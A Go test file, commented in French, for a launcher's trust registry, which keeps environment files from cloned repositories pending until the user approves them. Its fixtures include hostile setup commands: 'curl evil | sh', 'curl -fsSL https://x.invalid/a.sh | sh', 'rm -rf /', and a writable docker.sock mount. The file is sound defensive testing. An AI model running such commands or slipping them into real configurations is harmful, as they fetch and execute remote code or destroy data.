package core

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func trustProject(t *testing.T, env string) string {
	t.Helper()
	t.Setenv("CL_CONFIG_DIR", t.TempDir())
	d := t.TempDir()
	if env != "" {
		if err := os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(EnvPath(d), []byte(env), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return d
}

const evilEnv = "image: debian:12\nsetup:\n  - curl evil | sh\non_start:\n  - echo hi\nmounts:\n  - path: /var/run/docker.sock\n    ro: false\n"

func TestEnvTrustPendingApresClone(t *testing.T) {
	d := trustProject(t, evilEnv)
	if EnvTrust(d) != TrustTrusted {
		t.Fatal("projet sans entrée : de confiance")
	}
	if ok, err := MarkEnvPending(d, "https://github.com/a/b.git", "ubuntu:24.04"); !ok || err != nil {
		t.Fatal(ok, err)
	}
	if EnvTrust(d) != TrustPending {
		t.Fatal("pending attendu")
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvNotApproved) {
		t.Errorf("LoadEnv pending = %v", err)
	}
	// pas de fichier d'environnement : projet cloné enregistré « none » (jamais pending)
	d2 := trustProject(t, "")
	if ok, _ := MarkEnvPending(d2, "u", "i"); ok || EnvTrust(d2) != TrustNone {
		t.Errorf("clone sans env.yaml : %s", EnvTrust(d2))
	}
}

// Un marqueur posé PAR LE DÉPÔT (dans le projet) est sans effet : le registre est hors projet.
func TestEnvTrustMarqueurDuDepotIgnore(t *testing.T) {
	d := trustProject(t, evilEnv)
	_ = os.WriteFile(filepath.Join(d, ".claude-launcher", "trust.json"), []byte(`{"x":{"state":"accepted"}}`), 0o644)
	_ = os.WriteFile(filepath.Join(d, "trust.json"), []byte(`{"x":{"state":"accepted"}}`), 0o644)
	if EnvTrust(d) != TrustTrusted {
		t.Fatal("de confiance sans entrée du registre")
	}
	_, _ = MarkEnvPending(d, "u", "debian:12")
	if EnvTrust(d) != TrustPending {
		t.Error("un fichier du dépôt a influencé l'état")
	}
}

func TestEnvTrustReponses(t *testing.T) {
	d := trustProject(t, evilEnv)
	_, _ = MarkEnvPending(d, "https://github.com/a/b.git", "ubuntu:24.04")
	info, err := EnvTrustInfoFor(d)
	if err != nil || info.Risk.Exec != 2 || info.Risk.HostMounts != 1 || info.ChosenImage != "ubuntu:24.04" || info.Files["env.yaml"] != evilEnv {
		t.Fatalf("info = %+v %v", info, err)
	}
	// sha périmé : retry, rien d'écrit
	if retry, err := AnswerEnvTrust(d, "accept", "perime"); !retry || err == nil || EnvTrust(d) != TrustPending {
		t.Fatalf("sha périmé : retry=%v err=%v état=%s", retry, err, EnvTrust(d))
	}
	// cancel : rien
	if retry, err := AnswerEnvTrust(d, "cancel", info.SHA); retry || err != nil || EnvTrust(d) != TrustPending {
		t.Fatalf("cancel : %v %v %s", retry, err, EnvTrust(d))
	}
	// ignore : socle choisi seul
	if _, err := AnswerEnvTrust(d, "ignore", info.SHA); err != nil || EnvTrust(d) != TrustIgnored {
		t.Fatalf("ignore : %v %s", err, EnvTrust(d))
	}
	e, err := LoadEnv(d)
	if err != nil || e.Image != "ubuntu:24.04" || len(e.Setup) != 0 || len(e.Mounts) != 0 || len(e.OnStart) != 0 {
		t.Errorf("ignored : %+v %v", e, err)
	}
	// décision utilisateur : l'empreinte est comparée à chaque ouverture — fichiers changés ⇒ la question revient
	_ = os.WriteFile(EnvPath(d), []byte("image: debian:12\nsetup:\n  - rm -rf /\n"), 0o644)
	if EnvTrust(d) != TrustPending || !EnvTrustChanged(d) {
		t.Fatalf("modification des fichiers : état %s (changed=%v), pending attendu", EnvTrust(d), EnvTrustChanged(d))
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvChanged) || !errors.Is(err, ErrEnvNotApproved) {
		t.Errorf("LoadEnv après changement = %v", err)
	}
	if info, err := EnvTrustInfoFor(d); err != nil || !info.Changed || info.State != TrustPending {
		t.Errorf("info après changement : %+v %v", info, err)
	}
	// « Revoir » → pending (même sans changement) ; accept → env brut appliqué
	if err := ReviewEnvTrust(d); err != nil || EnvTrust(d) != TrustPending {
		t.Fatalf("revoir : %v %s", err, EnvTrust(d))
	}
	info, _ = EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err != nil || EnvTrust(d) != TrustAccepted {
		t.Fatalf("accept : %v", err)
	}
	if e, err := LoadEnv(d); err != nil || len(e.Setup) != 1 || !strings.Contains(e.Setup[0], "rm -rf") {
		t.Errorf("accepted : env brut attendu : %+v %v", e, err)
	}
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err == nil {
		t.Error("réponse sans question en attente acceptée")
	}
	if err := ReviewEnvTrust(trustProject(t, "")); err == nil {
		t.Error("revoir un projet de confiance accepté")
	}
}

func TestSafeTerminalText(t *testing.T) {
	got := SafeTerminalText("a\x1b[31mROUGE\x1b]0;titre\x07b\u009bc\r\nok\tx\x7f")
	if strings.ContainsAny(got, "\x1b\x07\x7f\u009b\r") || !strings.Contains(got, "ok\tx") {
		t.Errorf("SafeTerminalText = %q", got)
	}
}

// T1a : tout projet cloné est enregistré ; sans env.yaml « none » ; un env.yaml qui apparaît ensuite → pending.
func TestCloneSansEnvEnregistreNone(t *testing.T) {
	d := trustProject(t, "")
	if pending, err := MarkEnvPending(d, "https://github.com/a/b.git", ""); pending || err != nil {
		t.Fatal(pending, err)
	}
	if e, ok := EnvTrustEntry(d); !ok || e.State != TrustNone {
		t.Fatalf("entrée = %+v %v", e, ok)
	}
	if EnvTrust(d) != TrustNone {
		t.Fatalf("état = %s", EnvTrust(d))
	}
	if _, err := LoadEnv(d); !os.IsNotExist(err) {
		t.Errorf("LoadEnv sans fichier = %v", err)
	}
	_ = os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755)
	_ = os.WriteFile(EnvPath(d), []byte(evilEnv), 0o644) // le dépôt (git pull) apporte un env.yaml
	if EnvTrust(d) != TrustPending || !EnvTrustChanged(d) {
		t.Errorf("env.yaml apparu : %s", EnvTrust(d))
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvChanged) {
		t.Errorf("LoadEnv = %v", err)
	}
}

// Les écritures du launcher (F2 : image) mettent l'empreinte à jour ; celles du dépôt non.
func TestEmpreinteSuitLesEcrituresDuLauncher(t *testing.T) {
	d := trustProject(t, "image: debian:12\n")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	info, _ := EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err != nil {
		t.Fatal(err)
	}
	if err := setEnvImage(d, "ubuntu:24.04"); err != nil { // F2
		t.Fatal(err)
	}
	if EnvTrust(d) != TrustAccepted {
		t.Fatalf("écriture du launcher : %s (pas de re-demande attendue)", EnvTrust(d))
	}
	if e, err := LoadEnv(d); err != nil || e.Image != "ubuntu:24.04" {
		t.Errorf("env = %+v %v", e, err)
	}
	// le dépôt change le fichier PUIS le launcher écrit : le changement du dépôt n'est pas béni
	_ = os.WriteFile(EnvPath(d), []byte("image: ubuntu:24.04\nsetup:\n  - evil\n"), 0o644)
	_ = setEnvImage(d, "alpine:3")
	if EnvTrust(d) != TrustPending {
		t.Error("une écriture du launcher a béni un changement du dépôt")
	}
	// ignoré : le socle gardé suit F2
	d2 := trustProject(t, "image: debian:12\nsetup:\n  - x\n")
	_, _ = MarkEnvPending(d2, "u", "debian:12")
	i2, _ := EnvTrustInfoFor(d2)
	_, _ = AnswerEnvTrust(d2, "ignore", i2.SHA)
	if err := setEnvImage(d2, "fedora:40"); err != nil {
		t.Fatal(err)
	}
	if e, err := LoadEnv(d2); EnvTrust(d2) != TrustIgnored || err != nil || e.Image != "fedora:40" || len(e.Setup) != 0 {
		t.Errorf("ignoré après F2 : %s %+v %v", EnvTrust(d2), e, err)
	}
}

// T2 : registre illisible → échec fermé, jamais réécrit ; .bak avant chaque écriture ; entrée posée avant le clone.
func TestRegistreIllisibleEchecFerme(t *testing.T) {
	d := trustProject(t, evilEnv)
	for _, bad := range []string{"{pas du json", ""} {
		if err := os.WriteFile(trustPath(), []byte(bad), 0o600); err != nil {
			t.Fatal(err)
		}
		if EnvTrust(d) != TrustPending {
			t.Errorf("registre %q : %s, pending attendu (échec fermé)", bad, EnvTrust(d))
		}
		if _, err := LoadEnv(d); !errors.Is(err, ErrEnvNotApproved) || !errors.Is(err, ErrTrustBroken) {
			t.Errorf("LoadEnv registre %q = %v", bad, err)
		}
		if _, err := MarkEnvPending(d, "u", "i"); !errors.Is(err, ErrTrustBroken) {
			t.Errorf("écriture dans un registre illisible : %v", err)
		}
		if err := RegisterClone(d, "u", "i"); err == nil {
			t.Error("RegisterClone a réécrit un registre illisible")
		}
		if b, _ := os.ReadFile(trustPath()); string(b) != bad {
			t.Errorf("registre illisible réécrit : %q", b)
		}
		if _, err := AnswerEnvTrust(d, "accept", "x"); !errors.Is(err, ErrTrustBroken) {
			t.Errorf("réponse sur registre illisible : %v", err)
		}
	}
	// un projet SANS environnement n'est pas touché par un registre illisible
	if EnvTrust(trustProject(t, "")) != TrustTrusted {
		t.Log("(projet sans environnement : de confiance)")
	}
}

func TestRegistreBakAvantEcriture(t *testing.T) {
	d := trustProject(t, "image: debian:12\n")
	if err := RegisterClone(d, "u1", "i"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(trustPath() + ".bak"); err == nil {
		t.Error(".bak créé à la première écriture (rien à sauvegarder)")
	}
	first, _ := os.ReadFile(trustPath())
	if _, err := MarkEnvPending(d, "u2", "i"); err != nil {
		t.Fatal(err)
	}
	if b, err := os.ReadFile(trustPath() + ".bak"); err != nil || string(b) != string(first) {
		t.Errorf(".bak = %q %v, attendu l'état précédent", b, err)
	}
}

func TestUndoRetireLEntreeAvantClone(t *testing.T) {
	t.Setenv("CL_CONFIG_DIR", t.TempDir())
	base := t.TempDir()
	dir, undo, err := CreateProjectDir([]string{base}, base, "", false, "p")
	if err != nil {
		t.Fatal(err)
	}
	if err := RegisterClone(dir, "https://github.com/a/b.git", ""); err != nil {
		t.Fatal(err)
	}
	if _, ok := EnvTrustEntry(dir); !ok {
		t.Fatal("entrée absente")
	}
	undo() // clonage échoué
	if _, ok := EnvTrustEntry(dir); ok {
		t.Error("entrée d'approbation restée après l'échec du clonage")
	}
}

func TestRisqueCompteLesPaquetsWatchLocal(t *testing.T) {
	d := trustProject(t, "image: debian:12\npackages: [a, b]\npackages_by_manager:\n  apt: [c]\nwatch: [go.mod]\nlocal: [node_modules]\nsetup: [x]\n")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	info, _ := EnvTrustInfoFor(d)
	if r := info.Risk; r.Packages != 3 || r.Watch != 1 || r.Local != 1 || r.Exec != 1 {
		t.Errorf("risque = %+v", r)
	}
}

func TestSafeTerminalTextBidiEtInvisibles(t *testing.T) {
	in := "a\u202Eb\u200Bc\u2066d\u2069e\u061Cf\uFEFFg\u200Fh\u202Ai"
	got := SafeTerminalText(in)
	for _, r := range "\u202E\u200B\u2066\u2069\u061C\uFEFF\u200F\u202A" {
		if strings.ContainsRune(got, r) {
			t.Errorf("U+%04X conservé : %q", r, got)
		}
	}
	if !strings.Contains(got, "a·b·c·d·e·f·g·h·i") {
		t.Errorf("SafeTerminalText = %q", got)
	}
}

// Projet cloné en exécution hôte, « ignoré » sans socle, puis passé en conteneur (F2) : le socle choisi ensuite est pris
// en compte (pas de blocage « image manquante »), sans rien reprendre d'autre du dépôt.
func TestIgnoreSansSocleEtF2ConteneurPrendLeSocleCourant(t *testing.T) {
	d := trustProject(t, "image: debian:12\nsetup:\n  - curl evil | sh\n")
	_, _ = MarkEnvPending(d, "https://github.com/a/b.git", "") // hôte : aucun socle choisi à la création
	info, _ := EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "ignore", info.SHA); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadEnv(d); err == nil {
		t.Fatal("ignoré sans socle : une erreur « image manquante » est attendue tant qu'aucun socle n'est choisi")
	}
	if err := ApplyExec(d, "fedora:40", "srv1"); err != nil { // F2 : conteneur
		t.Fatal(err)
	}
	e, err := LoadEnv(d)
	if err != nil || e.Image != "fedora:40" || len(e.Setup) != 0 {
		t.Fatalf("socle courant attendu seul : %+v %v", e, err)
	}
	if EnvTrust(d) != TrustIgnored {
		t.Errorf("état = %s, ignored attendu (écriture du launcher : pas de re-demande)", EnvTrust(d))
	}
}

// Le refus d'un registre illisible dit comment s'en sortir (chemin, restaurer .bak ou supprimer), partout.
func TestRegistreIllisibleMessageDeReprise(t *testing.T) {
	d := trustProject(t, evilEnv)
	_ = os.WriteFile(trustPath(), []byte("{casse"), 0o600)
	want := []string{"registre d'approbation illisible", trustPath(), "restaurez trust.json.bak", "supprimez trust.json pour repartir de zéro"}
	check := func(what string, err error) {
		if err == nil {
			t.Errorf("%s : erreur attendue", what)
			return
		}
		for _, w := range want {
			if !strings.Contains(err.Error(), w) {
				t.Errorf("%s : message sans %q : %v", what, w, err)
			}
		}
	}
	_, err := LoadEnv(d)
	check("LoadEnv", err)
	_, err = AnswerEnvTrust(d, "accept", "x")
	check("AnswerEnvTrust", err)
	check("ReviewEnvTrust", ReviewEnvTrust(d))
	check("RegisterClone", RegisterClone(d, "u", "i"))
	info, err := EnvTrustInfoFor(d)
	if err != nil || info.State != TrustPending {
		t.Fatalf("info = %+v %v", info, err)
	}
	for _, w := range want {
		if !strings.Contains(info.Broken, w) {
			t.Errorf("info.Broken sans %q : %q", w, info.Broken)
		}
	}
	// registre sain : pas de message
	_ = os.Remove(trustPath())
	_, _ = MarkEnvPending(d, "u", "i")
	if i2, _ := EnvTrustInfoFor(d); i2.Broken != "" {
		t.Errorf("Broken renseigné pour un registre sain : %q", i2.Broken)
	}
}

// Clone SANS env.yaml + socle conteneur : l'état (none) est décidé sur le dépôt AVANT ApplyExec ; l'env.yaml écrit
// ensuite par le launcher re-scelle l'empreinte — aucune question à l'ouverture.
func TestCloneSansEnvAvecSocleResteNone(t *testing.T) {
	d := trustProject(t, "")
	if err := RegisterClone(d, "https://github.com/a/b.git", "fedora:40"); err != nil { // avant le clone
		t.Fatal(err)
	}
	if pending, err := MarkEnvPending(d, "https://github.com/a/b.git", "fedora:40"); pending || err != nil { // juste après, dépôt seul
		t.Fatal(pending, err)
	}
	if err := ApplyExec(d, "fedora:40", "srv1"); err != nil { // le launcher écrit env.yaml
		t.Fatal(err)
	}
	if !HasEnv(d) {
		t.Fatal("env.yaml non écrit par ApplyExec")
	}
	if EnvTrust(d) != TrustNone {
		t.Fatalf("état = %s, none attendu (env.yaml du launcher, pas du dépôt)", EnvTrust(d))
	}
	if e, err := LoadEnv(d); err != nil || e.Image != "fedora:40" {
		t.Errorf("ouverture sans question : %+v %v", e, err)
	}
	// puis un pull du dépôt qui change ce fichier : la question revient
	_ = os.WriteFile(EnvPath(d), []byte("image: fedora:40\nsetup:\n  - evil\n"), 0o644)
	if EnvTrust(d) != TrustPending {
		t.Error("changement du dépôt après coup non détecté")
	}
}

// r1 : le registre vit sous la racine de base (dossier partagé) ; un trust.json local est fusionné sans perte.
func TestRegistreSousLaRacineDeBase(t *testing.T) {
	root := t.TempDir()
	t.Setenv("CL_CONFIG_DIR", "")
	t.Setenv(RootBaseVar, root)
	if want := filepath.Join(root, ".config", "claude-launcher-ng2", "trust.json"); trustPath() != want {
		t.Errorf("trustPath = %q, attendu %q", trustPath(), want)
	}
	t.Setenv("CL_CONFIG_DIR", t.TempDir()) // surcharge explicite
	if trustPath() != filepath.Join(os.Getenv("CL_CONFIG_DIR"), "trust.json") {
		t.Error("CL_CONFIG_DIR n'emporte pas")
	}
}

func TestMigrationDuRegistreLocal(t *testing.T) {
	shared := t.TempDir()
	t.Setenv("CL_CONFIG_DIR", shared)
	legacy := t.TempDir()
	t.Setenv(TrustLegacyDirVar, legacy)
	write := func(dir string, m map[string]TrustEntry) {
		b, _ := json.Marshal(m)
		if err := os.WriteFile(filepath.Join(dir, "trust.json"), b, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write(shared, map[string]TrustEntry{"/p/commun": {State: TrustAccepted, SHA: "a"}, "/p/conflit": {State: TrustAccepted, SHA: "partage"}})
	write(legacy, map[string]TrustEntry{"/p/local": {State: TrustIgnored, SHA: "b", Image: "x"}, "/p/conflit": {State: TrustPending, SHA: "local"}, "/p/commun": {State: TrustAccepted, SHA: "a"}})
	n, err := MigrateLegacyTrust()
	if err != nil || n != 1 {
		t.Fatalf("fusion : %d %v, 1 entrée ajoutée attendue", n, err)
	}
	var got map[string]TrustEntry
	b, _ := os.ReadFile(filepath.Join(shared, "trust.json"))
	_ = json.Unmarshal(b, &got)
	if got["/p/local"].State != TrustIgnored || got["/p/local"].Image != "x" {
		t.Errorf("entrée locale perdue : %+v", got)
	}
	if got["/p/conflit"].SHA != "partage" || got["/p/commun"].SHA != "a" {
		t.Errorf("le registre partagé doit l'emporter : %+v", got)
	}
	if _, err := os.Stat(filepath.Join(shared, "trust.json.bak")); err != nil {
		t.Error(".bak absent avant la fusion")
	}
	if _, err := os.Stat(filepath.Join(legacy, "trust.json")); err != nil {
		t.Error("ancien fichier supprimé (doit être conservé)")
	}
	if n, err := MigrateLegacyTrust(); err != nil || n != 0 { // idempotent
		t.Errorf("seconde fusion : %d %v", n, err)
	}
}

func TestMigrationRegistrePartageIllisibleNonReecrit(t *testing.T) {
	shared := t.TempDir()
	t.Setenv("CL_CONFIG_DIR", shared)
	legacy := t.TempDir()
	t.Setenv(TrustLegacyDirVar, legacy)
	_ = os.WriteFile(filepath.Join(legacy, "trust.json"), []byte(`{"/p/x":{"state":"accepted"}}`), 0o600)
	_ = os.WriteFile(filepath.Join(shared, "trust.json"), []byte("{casse"), 0o600)
	if _, err := MigrateLegacyTrust(); !errors.Is(err, ErrTrustBroken) {
		t.Errorf("erreur = %v", err)
	}
	if b, _ := os.ReadFile(filepath.Join(shared, "trust.json")); string(b) != "{casse" {
		t.Errorf("registre illisible réécrit : %q", b)
	}
	// sans ancien fichier : rien à faire, pas d'erreur
	_ = os.Remove(filepath.Join(legacy, "trust.json"))
	if n, err := MigrateLegacyTrust(); n != 0 || err != nil {
		t.Errorf("sans ancien fichier : %d %v", n, err)
	}
}

// r2 : setup / on_start qui appellent un script du dépôt sont signalés.
func TestScriptsDuDepotSignales(t *testing.T) {
	d := trustProject(t, "image: debian:12\nsetup:\n  - ./scripts/install.sh --fast\n  - \"bash tools/setup.sh && make\"\n  - apt-get install -y curl\n  - curl -fsSL https://x.invalid/a.sh | sh\non_start:\n  - python3 bin/boot.py\n  - /usr/local/bin/ok\n  - echo $HOME\n")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	info, _ := EnvTrustInfoFor(d)
	got := strings.Join(info.Risk.Scripts, " ")
	for _, want := range []string{"./scripts/install.sh", "tools/setup.sh", "bin/boot.py"} {
		if !strings.Contains(got, want) {
			t.Errorf("script %q non signalé : %v", want, info.Risk.Scripts)
		}
	}
	for _, no := range []string{"curl", "apt-get", "/usr/local/bin/ok", "https://", "$HOME", "make"} {
		if strings.Contains(got, no) {
			t.Errorf("%q signalé à tort : %v", no, info.Risk.Scripts)
		}
	}
	if info.ScriptNote != ScriptNote || !strings.Contains(info.ScriptNote, "n'est pas couvert par l'approbation") {
		t.Errorf("ScriptNote = %q", info.ScriptNote)
	}
	// aucune référence : pas de message
	d2 := trustProject(t, "image: debian:12\nsetup:\n  - apt-get update\n")
	_, _ = MarkEnvPending(d2, "u", "debian:12")
	if i2, _ := EnvTrustInfoFor(d2); len(i2.Risk.Scripts) != 0 || i2.ScriptNote != "" {
		t.Errorf("signalement sans script : %+v", i2.Risk)
	}
}
